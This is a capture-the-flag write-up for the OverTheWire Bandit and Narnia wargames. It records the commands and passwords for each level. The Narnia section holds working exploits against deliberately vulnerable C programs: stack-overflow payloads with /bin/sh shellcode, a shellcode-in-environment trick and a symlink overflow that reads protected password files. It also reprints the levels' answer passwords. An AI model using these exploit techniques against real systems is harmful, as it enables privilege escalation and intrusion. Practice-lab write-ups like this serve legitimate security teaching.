# [overthewire](http://overthewire.org/wargames/)

## [bandit](http://overthewire.org/wargames/bandit/)

### level 0

        # ssh bandit0@bandit.labs.overthewire.org
        password: bandit0

        # cat readme
        boJ9jbbUNNfktd78OOpsqOltutMc3MY1

### level 1

        # ssh bandit1@bandit.labs.overthewire.org
        password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1

        # cat ./-
        CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

### level 2

        # ssh bandit2@bandit.labs.overthewire.org
        password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

        # cat spaces\ in\ this\ filename
        UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

### level 3

        # ssh bandit3@bandit.labs.overthewire.org
        password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

        # cat inhere/.hidden
        pIwrPrtPN36QITSp3EQaw936yaFoFgAB

### level 4

        # ssh bandit4@bandit.labs.overthewire.org
        password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB

        # file inhere/*
        inhere/-file00: data
        inhere/-file01: data
        inhere/-file02: data
        inhere/-file03: data
        inhere/-file04: data
        inhere/-file05: data
        inhere/-file06: data
        inhere/-file07: ASCII text
        inhere/-file08: data
        inhere/-file09: data
        
        # cat inhere/-file07
        koReBOKuIDDepwhWk7jZC0RTdopnAYKh

### level 5

        # ssh bandit5@bandit.labs.overthewire.org
        password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh

        # find inhere/ -size 1033c -exec cat {} \;
        DXjZPULLxYr17uwoI01bNLQbtFemEgo7

### level 6

        # ssh bandit6@bandit.labs.overthewire.org
        password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

        # find / -size 33c -user bandit7 -group bandit6 -exec cat {} \;
        HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

### level 7

        # ssh bandit7@bandit.labs.overthewire.org
        password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

        # cat data.txt | grep millionth
        cvX2JJa4CFALtqS87jk27qwqGhBM9plV

### level 8

        # ssh bandit8@bandit.labs.overthewire.org
        password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV

        # cat data.txt | sort | uniq -u
        UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

### level 9

        # ssh bandit9@bandit.labs.overthewire.org
        password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

        # cat data.txt | grep -a '==='
        truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

### level 10

        # ssh bandit10@bandit.labs.overthewire.org
        password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

        # cat data.txt | base64 --decode
        The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

### level 11

        # ssh bandit11@bandit.labs.overthewire.org
        password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

        # cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m"
        The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

### level 12

        # ssh bandit12@bandit.labs.overthewire.org
        password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

        # mkdir /tmp/viiing
        # cp data.txt /tmp/viiing
        # cd /tmp/viiing
        # xxd -r data.txt > data

Then extract the compressed file repeatedly using gunzip and bunzip2.

        # cat data8
        The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

## [narnia](http://overthewire.org/wargames/narnia/)

### level 0

        # ssh narnia0@narnia.labs.overthewire.org
        password: narnia0
        
        # cat /games/narnia/narnia0.c
        
        #include <stdio.h>
        #include <stdlib.h>

        int main(){
            long val=0x41414141;
            char buf[20];

            printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
            printf("Here is your chance: ");
            scanf("%24s",&buf);

            printf("buf: %s\n",buf);
            printf("val: 0x%08x\n",val);

            if(val==0xdeadbeef)
                system("/bin/sh");
            else {
                printf("WAY OFF!!!!\n");
                exit(1);
            }

            return 0;
        }
        
        # ((echo -e "12345123451234512345\xef\xbe\xad\xde");(echo cat /etc/narnia_pass/narnia1)) | /games/narnia/narnia0
        Correct val's value from 0x41414141 -> 0xdeadbeef!
        Here is your chance: buf: 12345123451234512345ﾭ�
        val: 0xdeadbeef
        efeidiedae

### level 1

        # ssh narnia1@narnia.labs.overthewire.org
        password: efeidiedae
        
        # cat /games/narnia/narnia1.c
        
        #include <stdio.h>

        int main(){
            int (*ret)();

            if(getenv("EGG")==NULL){    
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
            }

            printf("Trying to execute EGG!\n");
            ret = getenv("EGG");
            ret();

            return 0;
        }

        # export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
        # /games/narnia/narnia1
        # cat /etc/narnia_pass/narnia2
        nairiepecu
        
### level 2

        # ssh narnia2@narnia.labs.overthewire.org
        password: nairiepecu
        
        # cat /games/narnia/narnia2.c
        
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>

        int main(int argc, char * argv[]){
            char buf[128];

            if(argc == 1){
                printf("Usage: %s argument\n", argv[0]);
                exit(1);
            }
            strcpy(buf,argv[1]);
            printf("%s", buf);

            return 0;
        }
        
        # /games/narnia/narnia2 `python -c 'print "\x90"*108+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*4+"\xd0\xd5\xff\xff"'`
        
        # whoami
        narnia3
        
### level 3

        # ssh narnia3@narnia.labs.overthewire.org
        password: vaequeezee
        
        # cat /games/narnia/narnia3.c 

        
        #include <stdio.h>
        #include <sys/types.h>
        #include <sys/stat.h>
        #include <fcntl.h>
        #include <unistd.h>
        #include <stdlib.h>
        #include <string.h> 

        int main(int argc, char **argv)
        {
            int  ifd,  ofd;
            char ofile[16] = "/dev/null";
            char ifile[32];
            char buf[32];
 
            if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
            }
 
            /* open files */
            strcpy(ifile, argv[1]);
            if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
            }
            if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
            }
 
            /* copy from file1 to file2 */
            read(ifd, buf, sizeof(buf)-1);
            write(ofd,buf, sizeof(buf)-1);
            printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
            /* close 'em */
            close(ifd);
            close(ofd);
 
            exit(1);
        }


        # mkdir -p /tmp/pass/narnia3---------------/tmp
        # ln -s /etc/narnia_pass/narnia4 /tmp/pass/narnia3---------------/tmp/n4ps
        # touch /tmp/n4ps
        # /games/narnia/narnia3 /tmp/pass/narnia3---------------/tmp/n4ps
        copied contents of /tmp/pass/narnia3---------------/tmp/n4ps to a safer place... (/tmp/n4ps)

        # cat /tmp/n4ps
        thaenohtai

### level 4

        # ssh narnia4@narnia.labs.overthewire.org
        password: thaenohtai

        # cat /games/narnia/narnia4.c


        #include <string.h>
        #include <stdlib.h>
        #include <stdio.h>
        #include <ctype.h>

        extern char **environ;

        int main(int argc,char **argv){
            int i;
            char buffer[256];

            for(i = 0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));

            if(argc>1)
                strcpy(buffer,argv[1]);

            return 0;
        }

        # /games/narnia/narnia4 `python -c 'print "\x90"*219+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*27+"\xf0\xd4\xff\xff"'`
        # cat /etc/narnia_pass/narnia5
        faimahchiy


### level 5

        # ssh narnia5@narnia.labs.overthewire.org
        password: faimahchiy

        # cat /games/narnia/narnia5.c


        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
 
        int main(int argc, char **argv){
            int i = 1;
            char buffer[64];

            snprintf(buffer, sizeof buffer, argv[1]);
            buffer[sizeof (buffer) - 1] = 0;
            printf("Change i's value from 1 -> 500. ");

            if(i==500){
                printf("GOOD\n");
                system("/bin/sh");
            }

            printf("No way...let me give you a hint!\n");
            printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
            printf ("i = %d (%p)\n", i, &i);
            return 0;
        }
